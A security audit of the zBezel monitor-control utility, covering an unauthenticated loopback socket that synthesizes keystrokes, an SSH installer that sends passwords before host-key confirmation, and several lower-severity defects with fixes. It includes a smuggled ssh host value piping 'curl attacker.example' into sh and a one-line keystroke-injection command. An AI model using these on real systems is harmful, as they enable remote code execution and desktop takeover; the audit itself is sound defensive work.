# zBezel — Security Audit

**Standard:** `standards/standards/security-audit.md`  
**Date:** 2026-08-28  
**Findings raised:** 34 · **confirmed after verification:** 20  
**Scope:** `Sources/*.swift`, `Sources/ddc.c`, `Agent/BezelAgent.cs`, `Agent/*.ps1`, `Scripts/*.sh`

## Verdict

Publish it — after two code changes and one deletion, all of which are small and none of which touch the parts of zBezel that actually do the work. This is a well-built personal utility with one genuinely bad idea in it (an unauthenticated socket that synthesizes keystrokes) and one flow that quietly breaks its own promise to the user (the password installer). Neither is a design flaw you'd have to rearchitect around; both are half-finished edges. Fix those and the repo is in better shape than most personal projects that get published.

The honest framing on severity: on the single-user Windows companion box this README describes, an attacker who can reach 127.0.0.1:9110 already runs code as somebody on that machine, and if they're the console user they gain nothing they didn't have. What the `inject` command actually buys an attacker is a boundary crossing — a *second, less-privileged local account*, or a Low-integrity process that UIPI would otherwise block, gets full keyboard and mouse control of the console user's desktop by having the medium-integrity agent do the SendInput for it. That's real, it's local-only (the bind is IPAddress.Loopback and there is no firewall rule anywhere in the repo), and it caps out at medium-integrity code as the console user — not admin, not SYSTEM, since install-service.ps1:14 sets `-RunLevel Limited` and SendInput can't reach the UAC secure desktop.

But the reason to fix it before the first commit isn't the risk score. It's that `inject` has zero callers — I grepped Sources/, Scripts/, README.md and docs/ and found nothing — so it is a feature you are not using, shipped enabled, on an anonymous socket, in a public repo. That combination is what a reader will find first and what you'll spend a week defending in an issue thread. Deleting eleven lines makes the whole question disappear until the software-KVM work is real, at which point you build it on a named pipe with a DACL instead.

The password installer is the finding I'd actually worry about for a real user. AgentInstaller.swift:287 sets StrictHostKeyChecking=accept-new, step 0 (98-102) scans a fingerprint, and step 1 (105-114) authenticates with the password immediately — no gate between them, because step() at 214-226 contains no user-interaction await. InstallerView.swift:158 tells the user the host key is "worth checking against the machine itself the first time," and gives them no control to act on it before the password is on the wire. That text is a promise the code doesn't keep. Someone on the LAN who can answer for the hostname during a first install, or a user who fat-fingers the address, gets a reusable Windows credential. Exposure is genuinely bounded to first contact — accept-new still rejects a changed key afterward, and RemoteAgent.swift:88-95 doesn't weaken host-key checking at all — but first contact is exactly when your UI steers people to the password option (InstallerView.swift:117).

Two things I want to explicitly call NOT problems, so you don't waste time on them. The askpass mechanism (AgentInstaller.swift:245-269) is correct and I'd leave it alone: 0700 UUID directory in the per-user $TMPDIR, secret at 0600, handed to ssh via SSH_ASKPASS with REQUIRE=force and stdin nulled, so the password never lands in argv where `ps` would see it. Its only defect is the word "shredded" — the overwrite loop at 274-279 doesn't erase anything on APFS, where copy-on-write puts the zeros in fresh blocks. Change the word, keep the design. And the EDID serial appearing as a UserDefaults key name (Displays.swift:22-25) is not a leak at all: the same serial is readable by any local process with zero entitlements via CGDisplaySerialNumber, so persisting it in your own 0600 preferences file discloses nothing. Ignore that one entirely.

The one I'd fix for your own sake rather than security: Fail() at BezelAgent.cs:256-260 calls Environment.Exit(1), and it's reachable from every command the serve loop dispatches. That's an availability bug with an attacker, but the reason it matters is that it fires with no attacker at all — a `set` whose SetVCPFeature returns false (:396-398), or a `caps` against a monitor that won't answer (:335-339), which is exactly what a sleeping or mid-hotplug panel does. Both are commands the Mac routinely issues. The agent then stays down until the next logon, because install-service.ps1:17 sets -RestartCount 3 but the task action is wscript.exe running start-hidden.vbs, whose shell.Run(..., 0, False) at :5 returns instantly — Task Scheduler sees a task that succeeded and has nothing to restart. That's a monitor that stops responding until you log out, and you'll blame the hardware.

## Blockers

_All three were fixed before the initial commit._

1. Delete the `inject` command before the first public commit. Remove `case "inject": CmdInject(args); break;` at Agent/BezelAgent.cs:711 and CmdInject itself (509-553). It has zero senders anywhere in the repo, Main's argv switch (280-301) has no `inject` case either, and the README never mentions it — so this costs you nothing today. When the software-KVM feature is real, do not put it back on an anonymous TCP socket: use a named pipe with a DACL naming only the installing user, which gives you real peer identity via ImpersonateNamedPipeClient. A loopback TCP socket on Windows carries no peer identity and no ACL, so "127.0.0.1 only" is not access control.

2. Gate the password on host-key confirmation in Sources/AgentInstaller.swift. Make step 0 terminal for the password path: show the SHA256 fingerprint scanHostKey already computes (99-102) and require an explicit confirmation click before step 1 (105-114) authenticates. Then pin it — write the approved key to a temporary UserKnownHostsFile and switch to StrictHostKeyChecking=yes for the rest of the install, so a substituted key is a hard failure. Important detail: do NOT just relax to StrictHostKeyChecking=ask. The askpass helper at line 261 is `exec /bin/cat '<secret>'`, which answers ANY prompt, and with SSH_ASKPASS_REQUIRE=force (304) and stdin nulled (380) that would hand the password straight to the host-key confirmation prompt. Fix the gate and make the helper answer only password prompts. The key-auth path can keep accept-new — no secret is at risk there.

## Findings

### ZBZ-S001 — Unauthenticated loopback socket exposes SendInput keyboard/mouse injection into the console desktop session

**Severity:** high  
**File:** `Agent/BezelAgent.cs:653 (bind), 669-673 (serve loop), 711 (dispatch), 509-553 (CmdInject); Agent/install-service.ps1:14`

**Attack.** CmdServe binds TcpListener on IPAddress.Loopback:9110 (line 653) and dispatches each tab-separated line with no authentication, no token, and no peer check (669-673). Dispatch routes `inject` to CmdInject (711), which calls SendInput and SetCursorPos (482-501). install-service.ps1:14 registers the agent as an -AtLogOn task with an Interactive principal, so the synthesized input lands in the console session's desktop. Any local principal that can open a socket writes one line — `inject\tkey\t91\tdown` — and blind-drives Win+R to arbitrary code execution as the console user. A raw socket write suffices; BezelAgent.exe is not required.

What the attacker must already have: code execution as SOME local account on the Windows box, plus a signed-in, unlocked console session. The boundary actually crossed is cross-principal only — a separate less-privileged local user account reaching the console user's desktop, or a Low-integrity process bypassing UIPI by having the medium-integrity agent perform the SendInput on its behalf. Malware already running as the console user gains nothing, since it can call SendInput directly.

Ceiling, stated precisely: medium-integrity code as the console user, not admin and not SYSTEM. install-service.ps1:14 sets -RunLevel Limited, so the agent is medium integrity even when the owning account is an administrator; UIPI discards input aimed at already-elevated windows, and SendInput cannot reach the Winlogon secure desktop. Two claims from the source findings do NOT hold and should not appear in any writeup: a sandboxed browser renderer cannot reach this socket (AppContainer loopback is blocked by default absent a CheckNetIsolation exemption), and SSH access as the console account is not an escape from session isolation (that account can already register its own Interactive scheduled task — run-agent.ps1 does exactly that).

**Fix.** Delete `case "inject": CmdInject(args); break;` at line 711 and CmdInject at 509-553. Verified free: grep over Sources/, Scripts/, README.md and docs/ returns zero hits for `inject`, and Main's argv switch (280-301) has no inject case, so the command is reachable only through this socket and nothing sends it. When the KVM feature lands, move the channel to a named pipe with an explicit DACL granting only the console user (ImpersonateNamedPipeClient gives real peer authentication), or if TCP is kept, generate a random token at install time into %USERPROFILE%\bezel\token with an owner-only ACL, have the Mac read it over the already-authenticated SSH channel, and require it as the first tab-separated field of every command. Gate inject behind an additional explicit opt-in even then.

### ZBZ-S002 — Installer sends the Windows account password to an unverified SSH host key, with the fingerprint shown as advisory text and no confirmation gate

**Severity:** medium  
**File:** `Sources/AgentInstaller.swift:287 (sshOptions), 334 (scp), 98-102 (step 0 scan), 105-114 (step 1 authenticates), 214-226 (step); Sources/InstallerView.swift:157-163, 117`

**Attack.** StrictHostKeyChecking=accept-new is set above the auth switch at line 287, so it applies to the password path as well as the key path, and is repeated for scp at 334. On first contact ssh silently accepts whatever host key is presented. run() scans a host-key fingerprint in step 0 (98-102) and authenticates with the password in step 1 (105-114) with nothing in between — step() at 214-226 contains no user-interaction await, and the scanned key is never pinned (it goes to a scratch file consumed only by `ssh-keygen -lf` at 357-358, then deleted; no UserKnownHostsFile is ever passed). With SSH_ASKPASS_REQUIRE=force (304) and stdin nulled (380), ssh hands the plaintext password to whatever host answers. InstallerView.swift:158 renders the fingerprint as passive text with no control the user can act on, and InstallerView.swift:117 actively steers users to the password option precisely when no known_hosts entry exists.

What the attacker must already have: a position on the LAN able to answer for that hostname at the moment of the first install (ARP/DNS spoofing, rogue DHCP-supplied DNS, mDNS/NBNS squatting of an unqualified short name) — or nothing at all, if the user simply mistypes the address onto a host someone else controls.

Scope corrections worth keeping straight: exposure is bounded to first contact, since accept-new still rejects a CHANGED key and RemoteAgent.swift:88-95 uses OpenSSH defaults for ongoing use. The side effect is that the Mac's known_hosts becomes pinned to the attacker's key, so later runs raise no warning. Drop the secondary claim that the installed SSH public key is also disclosed — it is public and grants the attacker nothing. Also drop the claim that the fingerprint renders only after the password is transmitted; hostFingerprint is set on the MainActor at line 100 and step 1 suspends at execute()'s continuation, so SwiftUI may well paint it while auth is in flight. The defect is the absence of a blocking gate, not render ordering.

**Fix.** Make step 0 terminal on the password path: show the SHA256 fingerprint and require an explicit confirmation before step 1 runs. Then pin — write the approved key into an installer-controlled known_hosts and pass -o UserKnownHostsFile with StrictHostKeyChecking=yes for every subsequent command, so the rest of the install cannot be redirected. Do not simply switch to StrictHostKeyChecking=ask: the askpass helper at line 261 (`exec /bin/cat '<secret>'`) answers any prompt, so with REQUIRE=force it would feed the password to the host-key confirmation prompt. The helper must answer only password prompts.

### ZBZ-S003 — Fail() calls Environment.Exit inside the persistent serve loop, and the scheduled task cannot restart the agent

**Severity:** low  
**File:** `Agent/BezelAgent.cs:256-260 (Fail), reached via Dispatch (688-713) from 331, 337, 344, 391, 398, 413, 511, 547, 558; Agent/install-service.ps1:17; Agent/start-hidden.vbs:5`

**Attack.** Fail was written for the one-shot CLI, where Environment.Exit(1) is correct, but it is reachable from every command the socket server dispatches. Any local process sends a single short line — `get`, `caps`, `set`, `probe`, `inject` without its required arguments — and the whole agent exits. The serve loop's catch(Exception) at 680 cannot intercept process exit, and because Dispatch has redirected Console.Out to a StringWriter (693-694) the client gets a closed connection rather than the error message.

The attacker-free trigger is the one that matters: CmdSet calls Fail when SetVCPFeature returns false (396-398) and CmdCaps calls Fail when the monitor returns no capabilities string (335-339) — exactly what a sleeping or mid-hotplug panel does, and both are commands the Mac routinely issues (RemoteAgent.swift:154, :229). The agent then stays down until the next interactive logon: install-service.ps1:17 sets -RestartCount 3, but the task action is wscript.exe running start-hidden.vbs, whose shell.Run(..., 0, False) at line 5 launches the agent detached and returns immediately, so Task Scheduler records a task that succeeded in milliseconds and never observes the agent's death. The only trigger is -AtLogOn and there is no watchdog on either side.

What the attacker must already have: code execution as any local account on the Windows host. Impact is availability-only and local-only — the bind is loopback (653) and denying monitor control is a lesser included impact of a precondition that already permits far more.

**Fix.** Give the server path its own error return: have these routines throw a dedicated AgentError that the serve loop's existing catch at 673-674 renders as a JSON error line — that path already works and is why malformed ParseCode/uint.Parse input is harmless today. Keep Environment.Exit only in Main's one-shot argv branch. CmdSetGet at 413-422 already uses roughly the right pattern. Separately, have the scheduled task run the agent in the foreground rather than detaching through wscript, so -RestartCount actually applies.

### ZBZ-S004 — run-agent.ps1 builds a .bat from arguments with unescaped quote-wrapping — dead code shipped to every host

**Severity:** informational  
**File:** `Agent/run-agent.ps1:16-18; copy sites Scripts/build-app.sh:31, Scripts/deploy-agent.sh:21, Sources/AgentInstaller.swift:454`

**Attack.** Line 16 wraps each argument in double quotes by string concatenation with no escaping, line 17 writes the result into %USERPROFILE%\bezel\agent-run.bat, and lines 21-24 register and start a scheduled task that runs it. An argument containing a double quote closes the quote and cmd.exe then honours &, |, > and %VAR% expansion.

Not reachable: nothing in the repository invokes this script. All three grep hits are file-copy lists. The live path is install-service.ps1 -> `BezelAgent.exe serve`, and the Mac drives it through RemoteAgent.swift:85's `client` subcommand whose arguments are allowlisted to alphanumerics plus -_. at RemoteAgent.swift:75-81, which would reject a quote outright. BezelAgent.cs spawns no processes at all, so the network-facing agent cannot reach it. Invoking it requires PowerShell as that user — already code execution — and the task it registers runs as the same identity at -RunLevel Limited, so no privilege boundary is crossed.

What the attacker must already have: something that calls this script with attacker-controlled arguments, which nothing does.

**Fix.** Delete Agent/run-agent.ps1 and drop it from the three copy sites (Scripts/build-app.sh:31, Scripts/deploy-agent.sh:21, and the `names` array at Sources/AgentInstaller.swift:454). It is superseded by the serve/client architecture. Shipping less is the fix — there is no reason to install a code-injection-shaped script onto every proxy host for a path nobody calls.

### ZBZ-S005 — Hostname and username reach ssh/scp argv unvalidated, unlike every other argument

**Severity:** low  
**File:** `Sources/RemoteAgent.swift:95, 243, 68-70; Sources/AgentInstaller.swift:325, 338, 344, 32, 89`

**Attack.** sanitize() at RemoteAgent.swift:75-81 correctly restricts every VCP argument to alphanumerics plus -_. before interpolation into the remote command string. config.host skips it entirely and goes straight into ssh's argument vector at line 95. ssh parses options before the destination, so a host beginning with `-` is consumed as an option: `-oProxyCommand=curl attacker.example|sh` makes ssh execute that through /bin/sh on the Mac. (Precisely: the NEXT argv element then becomes ssh's destination — in RemoteAgent that is the remote command string — but the outcome holds, because ssh runs ProxyCommand instead of resolving it.) controlPath at 68-70 concatenates the host into a filesystem path, so `/` or `..` relocates the control socket; low impact, since it only moves a unix-domain socket bind and ssh will not bind over an existing file.

The same unvalidated pattern appears in five more places the individual lens findings under-cited: RemoteAgent.swift:243 (disconnect), AgentInstaller.swift:325 (target.destination), :338 (scp, which parses options identically), and :344 (target.host to ssh-keyscan). AgentInstaller.swift:32 builds destination as "user@host", making Target.user (typed at InstallerView.swift:72) a second unvalidated source; :89 checks only that host is non-empty.

What the attacker must already have: the ability to set proxyHost — meaning the user types it into AdvancedTabs.swift:246 or InstallerView.swift:71, or a process already running as that user writes ~/Library/Preferences/com.darkstar.zBezel.plist. There is no URL-scheme handler, no service discovery, no pasteboard read, and the agent's JSON reply cannot feed a hostname back (it populates only remoteMonitors). So NO trust boundary is crossed today and the plist vector is post-exploitation, not an attack path. This becomes a real vulnerability the moment a hostname can arrive from anywhere other than the user's keyboard — config import, discovery, a URL scheme.

**Fix.** Validate host and user at the point of entry against a hostname/IP grammar: reject empty, reject a leading `-`, reject `/` (which also fixes controlPath), and restrict to letters, digits, dot, hyphen and colon for IPv6 literals. Additionally pass `--` immediately before the destination in every ssh/scp argv as defence in depth — but validate rather than relying on `--` alone.

### ZBZ-S006 — Single-threaded serve loop with a 5-minute per-read timeout and an uncapped ReadLine

**Severity:** low  
**File:** `Agent/BezelAgent.cs:658-684 (loop), 667 (timeouts), 669 (ReadLine), 698 + 211-222 + 167-178 (enumeration cost)`

**Attack.** The accept loop is strictly serial: one connection is read, dispatched and closed before the next is accepted. ReceiveTimeout at 667 is 300000 ms and is per-read SO_RCVTIMEO, not per-connection, so a client that connects and dribbles one byte every four minutes holds the sole thread indefinitely and denies the Mac all monitor control. reader.ReadLine() at 669 has no length cap, so a client streaming megabytes with no newline grows the StreamReader's buffer without bound. The wedge is amplified by enumeration: Dispatch calls Targets(refresh:false) unconditionally at 698, and when the monitor is absent Targets (211-222) refuses to cache an empty result while EnumerateSettled (167-178) sleeps 600 ms after each of ten attempts, so each request occupies the thread for about six seconds (up to twelve with the 726-742 retry).

What the attacker must already have: code execution as a local account on the Windows host — the same precondition that, before the `inject` deletion, already permitted session takeover, so denying monitor control is a lesser included impact. The Mac's relay path fails after 20 s rather than hanging (SendToService, 797). This is a robustness defect, not a meaningful security exposure.

**Fix.** Accumulate bytes until newline with a hard cap around 4 KB, enforce a whole-connection deadline with a Stopwatch rather than relying on SO_RCVTIMEO, and drop ReceiveTimeout to a couple of seconds — a legitimate client sends its single line immediately. Hand each accepted connection to a thread-pool work item so one stalled peer cannot block the accept loop, and cap concurrent connections.

### ZBZ-S007 — listener.Start() is unguarded, so a squatter on port 9110 kills the agent silently and can impersonate it to the Mac

**Severity:** low  
**File:** `Agent/BezelAgent.cs:641 (DefaultPort), 653-654 (bind/Start), 282 (serve dispatched before Main's try at 291); Sources/RemoteAgent.swift:114-129`

**Attack.** Any local process that binds 127.0.0.1:9110 before the logon task fires wins, because Windows loopback TCP is first-bind-wins. listener.Start() at 654 then throws out of CmdServe with no handler — Main dispatches "serve" at line 282, before its try block at 291 — and the agent dies at startup. The squatter answers every query the Mac makes, and RemoteAgent.run() simply parses the last JSON line and believes it (114-129), so monitor lists, readings and link state are attacker-chosen, and the installer's verification step (AgentInstaller.swift:190-210) can be made to pass against a machine with no monitor. Impact is fabricated monitor data, not compromise.

One piece of evidence from the source finding is misapplied and should be dropped: SO_EXCLUSIVEADDRUSE does not defend this. It only prevents a later SO_REUSEADDR hijack of an already-listening socket; against a squatter that binds first, an exclusive-use flag on the agent's own socket changes nothing. The real defects are the missing try/catch and the total absence of peer authentication.

What the attacker must already have: code execution as some local account, running before console logon (a service, another user's Run-key entry). Note that install-service.ps1:17's -RestartCount 3 never fires here either, for the same wscript detach reason as the Fail() finding — which reinforces "dies silently" rather than mitigating it.

**Fix.** Wrap listener.Start() so a bind failure is reported as a clear error rather than an unhandled exception at logon, and authenticate the channel in both directions with the install-time token from the inject fix so the Mac can distinguish the real agent from a squatter. A named pipe with a DACL solves both problems at once.

### ZBZ-S008 — Askpass staging is sound; only the security promise it makes is inaccurate

**Severity:** informational  
**File:** `Sources/AgentInstaller.swift:245-269 (setUpAskpass), 271-282 (tearDownAskpass), 70-74 (defer), 242 (doc comment), 261 (path interpolation); Sources/InstallerView.swift:108-112`

**Attack.** The mechanism is correct and should be left alone: a UUID directory at 0700 in the per-user $TMPDIR, the secret at 0600, handed to ssh via SSH_ASKPASS with REQUIRE=force and stdin nulled, so the password never appears in argv where `ps` would see it. Three real but low-consequence gaps. (1) The overwrite-before-unlink at 274-279 is not a secure erase on APFS — copy-on-write lands the zeros in fresh blocks and leaves the original extent recoverable — so both the doc comment at 242 and the UI text at InstallerView.swift:110 saying the password is "shredded" state something the code cannot guarantee. (2) tearDownAskpass runs only from the defer at 70-74, so a crash or SIGKILL mid-install leaves the password in cleartext in $TMPDIR until dirhelper reaps it, and there is no startup sweep of stale zbezel-* directories. (3) Line 261 interpolates a path into a single-quoted /bin/sh string; a quote can only appear if TMPDIR contains one, which requires control of the app's launch environment.

What the attacker must already have: root, physical/raw block access, or already running as this user — all below the bar for a vulnerability. Strike the claim that the password persists in InstallerView's @State and Auth.password for the app's lifetime: Auth is never stored on AgentInstaller (it is threaded through as a parameter), and the @State password is released when the sheet is dismissed.

**Fix.** Change "shredded" to what the code actually guarantees — held in a private temporary file for the length of the install, never placed on a command line, deleted afterwards — in both InstallerView.swift:110 and the doc comment at AgentInstaller.swift:242, and drop the overwrite loop. Add a best-effort sweep of leftover zbezel-* directories at installer startup. Pass the secret path to the helper via an environment variable (`exec /bin/cat "$BEZEL_SECRET"`) instead of interpolating it, which removes the quoting question entirely.

### ZBZ-S009 — config.exePath is interpolated unescaped into the remote PowerShell command — a trap for a future edit, not a bug today

**Severity:** informational  
**File:** `Sources/RemoteAgent.swift:85, 57`

**Attack.** run() builds `"& \"\(config.exePath)\" client " + safe.joined(...)`. Everything after `client` is sanitized; the path itself is dropped into a double-quoted PowerShell string, and this ssh path passes the command plainly (line 95) rather than via -EncodedCommand, so the remote shell really would parse an embedded quote. Not exploitable and less reachable than the source findings claimed: exePath is a hardcoded default at line 57 with no assignment anywhere in the repo — no UI, no UserDefaults key, no decoder, no argument — so it can only change by recompiling. It is worth recording because line 74's own comment states the rule ("Arguments reach a remote shell, so allow only what the protocol needs") and this value is the single exception to it.

**Fix.** Add a comment at line 57 noting that exePath is trusted by construction and must not be made user-configurable without escaping. If it ever becomes configurable, run it through a path validator and double any quote and backtick before interpolation.

### ZBZ-S010 — Monitor EDID serial as a UserDefaults key name — not a security issue, listed only to close the question

**Severity:** informational  
**File:** `Sources/Displays.swift:22-25; Sources/MonitorController.swift:288-289, 298-302`

**Attack.** stableKey concatenates vendor ID, model ID and the EDID serial, and MonitorController.swift:288 builds `targetKey = "inputState." + local.stableKey`, so the display's serial appears as a readable key name in com.darkstar.zBezel.plist (and again as the value of "lastTargetKey" at :289). There is no information disclosure: the same serial is already readable by any local process with zero entitlements via CGDisplaySerialNumber or the IORegistry EDID, so persisting it exposes nothing to anyone who could not obtain it more directly, and the file is the app's own preferences at mode 0600. Answering the runtime half of the audit directly: this is the only unexpected thing written to disk. VendorMapping.swift:78-82 stores nothing but VCP code numbers, and no credential is ever written to UserDefaults or the Keychain — the SSH password exists only in the temporary askpass file for the duration of the install.

**Fix.** Nothing required. If you would rather the plist read cleanly, use a truncated SHA256 of stableKey as the key — it only needs to be stable, not human-readable. Otherwise one line in the README noting that per-monitor settings are keyed by display serial is sufficient.

## Notes for the README

- The Windows agent listens on 127.0.0.1:9110 with no authentication, and any local account on that machine can send it commands. State this plainly and say what it means: on a single-user box it is a low concern, but on a machine with more than one user account, another user can read and change your monitor settings. Do not describe loopback as an access control — Windows applies no ACL to loopback TCP and does not firewall it.
- The agent runs in the interactive desktop session as a logon scheduled task at -RunLevel Limited (medium integrity, never elevated), because the Windows Monitor Configuration API needs a real window station. Say why, so readers do not assume it is a service running as SYSTEM.
- The password install path uses trust-on-first-use for the SSH host key. Until the confirmation gate lands, say outright that the first connection to a machine accepts whatever host key it is offered, and that users should prefer the SSH-key option or run the first install on a network they trust. Once the gate ships, replace this with a note that the fingerprint must be confirmed against the machine itself.
- Describe what the installer does to the Windows box: creates %USERPROFILE%\bezel, copies the agent source, compiles it with the in-box csc.exe, registers a BezelAgentService logon task, and optionally appends the Mac's SSH public key to authorized_keys. People are entitled to know what a one-click installer changed before they run it.
- Say how to uninstall: Unregister-ScheduledTask -TaskName BezelAgentService, remove %USERPROFILE%\bezel, and remove the added key from authorized_keys. An installer without a documented reversal is the thing that makes people distrust a repo.
- State that the app is ad-hoc signed (Scripts/build-app.sh:57, `codesign --force --sign -`), unsandboxed and unnotarized, so users know they are trusting a locally built binary and will see Gatekeeper complain.
- Note that per-monitor settings are keyed by display serial in the app's preferences — one line, closes the question before anyone asks it.
- Minor, not security: your private hostname `rigel` appears as the default in Scripts/deploy-agent.sh:5 and :11, and visibly in docs/screenshot.png as the 'via rigel' pill. It is an unqualified LAN name and discloses nothing exploitable, but if you would rather not publish your own machine names, change the default to a placeholder and retake the screenshot against a generic host.
